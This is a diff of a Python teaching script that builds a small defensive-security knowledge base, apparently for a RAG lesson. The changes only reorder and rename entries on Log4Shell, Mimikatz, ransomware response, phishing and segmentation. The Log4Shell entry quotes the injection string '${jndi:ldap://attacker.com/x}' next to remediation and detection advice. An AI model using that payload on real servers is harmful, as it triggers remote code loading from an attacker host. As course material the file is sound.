@@ -19,19 +19,9 @@ print("  TASK 1: Index the Knowledge Base")
 print("=" * 60)
 
 # Security knowledge base — 6 documents covering different topics
+# Doc IDs and order are kept consistent with Lesson 4.4 (RAG) so the
+# learner sees the same KB structure across both lessons.
 KB = [
-    {
-        "id": "log4shell",
-        "title": "CVE-2021-44228 Log4Shell",
-        "text": (
-            "Log4Shell is a critical remote code execution vulnerability in Apache Log4j2. "
-            "An attacker injects ${jndi:ldap://attacker.com/x} into any logged field such as "
-            "User-Agent or X-Forwarded-For. The JNDI lookup triggers remote class loading "
-            "without authentication. Remediation: upgrade to Log4j 2.17.1 or later. "
-            "Detection: monitor for outbound LDAP connections from application servers and "
-            "${jndi: patterns in web access logs."
-        ),
-    },
     {
         "id": "mimikatz",
         "title": "Mimikatz Credential Theft",
@@ -45,7 +35,19 @@ KB = [
         ),
     },
     {
-        "id": "ransomware_playbook",
+        "id": "log4shell",
+        "title": "CVE-2021-44228 Log4Shell",
+        "text": (
+            "Log4Shell is a critical remote code execution vulnerability in Apache Log4j2. "
+            "An attacker injects ${jndi:ldap://attacker.com/x} into any logged field such as "
+            "User-Agent or X-Forwarded-For. The JNDI lookup triggers remote class loading "
+            "without authentication. Remediation: upgrade to Log4j 2.17.1 or later. "
+            "Detection: monitor for outbound LDAP connections from application servers and "
+            "${jndi: patterns in web access logs."
+        ),
+    },
+    {
+        "id": "ransomware",
         "title": "Ransomware Incident Response Playbook",
         "text": (
             "Phase 1 (0-30 min): Confirm indicators, identify Patient Zero, assess blast radius. "
@@ -68,6 +70,17 @@ KB = [
         ),
     },
     {
+        "id": "phishing",
+        "title": "Phishing Email Detection",
+        "text": (
+            "Phishing emails trick users into revealing credentials or executing malware. "
+            "Indicators: sender domain mismatch, urgency language, suspicious attachments "
+            "(especially .docm, .xlsm, .iso, .lnk), and URL shorteners. Technical controls: "
+            "SPF, DKIM, and DMARC for email authentication. User training with simulated phishing "
+            "campaigns reduces click rates. Quarantine emails scoring above threshold."
+        ),
+    },
+    {
         "id": "network_segmentation",
         "title": "Network Segmentation for Defence",
         "text": (
@@ -76,17 +89,6 @@ KB = [
             "OT/SCADA for operational technology, and management for admin access. Use VLANs and "
             "firewall rules to enforce zone boundaries. Zero Trust architecture extends this by "
             "verifying every connection regardless of network location."
-        ),
-    },
-    {
-        "id": "phishing_detection",
-        "title": "Phishing Email Detection",
-        "text": (
-            "Phishing emails trick users into revealing credentials or executing malware. "
-            "Indicators: sender domain mismatch, urgency language, suspicious attachments "
-            "(especially .docm, .xlsm, .iso, .lnk), and URL shorteners. Technical controls: "
-            "SPF, DKIM, and DMARC for email authentication. User training with simulated phishing "
-            "campaigns reduces click rates. Quarantine emails scoring above threshold."
         ),
     },
 ]
